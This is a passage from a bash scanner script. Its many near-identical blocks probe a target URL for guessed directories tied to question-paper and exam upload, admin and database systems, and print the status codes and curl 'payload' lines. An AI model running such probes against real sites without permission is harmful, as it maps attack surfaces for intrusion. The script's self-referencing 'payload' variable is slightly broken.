code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControlQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControlQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
